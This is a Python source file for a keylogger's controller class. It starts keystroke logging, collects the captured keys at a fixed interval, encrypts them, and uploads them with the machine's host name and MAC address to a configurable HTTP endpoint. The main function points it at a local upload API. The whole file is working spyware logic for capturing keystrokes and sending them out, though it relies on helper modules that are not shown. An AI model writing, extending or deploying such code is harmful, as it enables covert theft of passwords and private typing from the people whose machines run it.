from keyLoggerService import *
from fileWriter import *
from networkWriter import *
from buffer import *
from encryptor import *
from getmac import get_mac_address
import socket

class KeyLoggerManager:

    def __init__(self, url: str, interval: int = 10):
        self.__interval = interval
        self.__buffer = Buffer()
        self.__machine_name = {socket.gethostname(): str(get_mac_address())}
        self.__service = KeyLoggerService()
        self.__filewriter = FileWriter()
        self.__networkwriter = NetworkWriter(url)

    def change_url(self, url: str) -> None:
        self.__networkwriter = NetworkWriter(url)


    def collect_data(self) -> None:
        self.__service.start_logging()
        duration = self.__interval
        while True:
            time.sleep(duration)
            self.__buffer.add_data(" ".join(self.__service.get_logged_keys()))
            self.send_data(self.process_data())
            self.__buffer.flush()
            self.__service.flush()
            print(self.__buffer.get_data())

    def process_data(self):
        data = self.__buffer.get_data()
        data_str = " ".join(data)
        #print(f"Data before encryption: {data_str}")
        encrypted_data1 = Encryptor().encrypt(data_str)
        #print(f"Data after encryption: {encrypted_data1}")
        return encrypted_data1


    def send_data(self, enc_data: str) -> None:
        machine_name = self.__machine_name
        #self.__filewriter.send_data(enc_data, machine_name)
        self.__networkwriter.send_data(enc_data, machine_name)



def main():
    manager = KeyLoggerManager("http://127.0.0.1:5000/api/upload", 10)
    manager.collect_data()

if __name__ == "__main__":
    main()

